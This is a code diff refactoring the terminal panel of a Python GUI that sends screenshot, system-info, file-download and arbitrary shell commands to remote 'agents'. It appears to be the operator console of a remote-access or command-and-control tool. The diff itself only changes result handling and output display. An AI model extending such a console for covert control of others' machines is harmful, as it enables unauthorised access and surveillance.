@@ -294,20 +294,21 @@ class TerminalPanel(ctk.CTkFrame):
         arg = parts[1] if len(parts) > 1 else ""
 
         if action == "screenshot":
-            ok = self._manager.execute(Action.SCREENSHOT, agent=agent)
+            dispatch = self._manager.execute(Action.SCREENSHOT, agent=agent)
         elif action == "sysinfo":
-            ok = self._manager.execute(Action.SYSINFO, agent=agent)
+            dispatch = self._manager.execute(Action.SYSINFO, agent=agent)
         elif action == "cd":
-            ok = self._manager.execute(Action.CD, params={"path": arg}, agent=agent)
+            dispatch = self._manager.execute(Action.CD, params={"path": arg}, agent=agent)
         elif action == "dl":
-            ok = self._manager.execute(Action.DOWNLOAD, params={"file": arg}, agent=agent)
+            dispatch = self._manager.execute(Action.DOWNLOAD, params={"file": arg}, agent=agent)
         elif action == "ping":
-            ok = self._manager.execute(Action.PING, agent=agent)
+            dispatch = self._manager.execute(Action.PING, agent=agent)
         else:
-            ok = self._manager.execute(Action.SHELL, params={"cmd": cmd}, agent=agent)
+            dispatch = self._manager.execute(Action.SHELL, params={"cmd": cmd}, agent=agent)
 
-        if not ok:
+        if not dispatch.ok:
             self._print_error("Impossible d'envoyer la commande.")
+            return
 
     # ------------------------------------------------------------------
     # Events
@@ -332,11 +333,29 @@ class TerminalPanel(ctk.CTkFrame):
     def _on_response(self, agent: AgentInfo, msg: dict):
         if msg.get("type") != MsgType.RESPONSE:
             return
+
+        selected = self._manager.selected
+        if not selected or agent.id != selected.id:
+            return
+
         action = msg.get("action")
         data = msg.get("data", {})
+        pending_meta = (msg.get("meta") or {}).get("pending")
 
         def update():
+            if pending_meta is None:
+                self._print_info("Réponse reçue sans suivi de requête (commande ancienne ou orpheline).")
+
             if action == Action.SHELL:
+                meta_bits = []
+                if "exit_code" in data:
+                    meta_bits.append(f"exit={data.get('exit_code')}")
+                if "duration_ms" in data:
+                    meta_bits.append(f"duree={data.get('duration_ms')}ms")
+                if "shell" in data:
+                    meta_bits.append(f"shell={data.get('shell')}")
+                if meta_bits:
+                    self._print_info("[exec] " + " | ".join(meta_bits))
                 out = data.get("output", "")
                 self._print_output(out if out.strip() else "(pas de sortie)")
 
